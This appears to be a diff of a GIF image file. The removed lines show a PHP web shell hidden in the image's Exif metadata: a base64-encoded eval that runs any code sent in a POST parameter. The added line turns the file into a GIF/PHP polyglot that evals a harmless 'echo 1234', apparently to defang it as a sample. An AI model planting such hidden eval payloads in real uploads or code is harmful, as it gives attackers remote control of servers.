@@ -1,6 +1,2 @@
 GIF89
-^@^A^B^@^@d^@d^@^@ÿá^@¡Exif^@^@II*^@
-^H^@^@^@^B^@^O^A^B^@^F^@^@^@&^@^@^@^P^A^B^@m^@^@^@,^@^@^@^@^@^@^@/.*/e^
-@ eval ( base64_decode("aWYgKGl zc2V0KCRfUE9TVFsie noxIl0pKSB7ZXZhbChzd
-HJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30='));
-@ÿì^@^QDucky^@^A^@^D^@^@^@<^@^@ÿî^@^NAdobe^
+<?php eval(base64_decode('ZWNobyAxMjM0'));
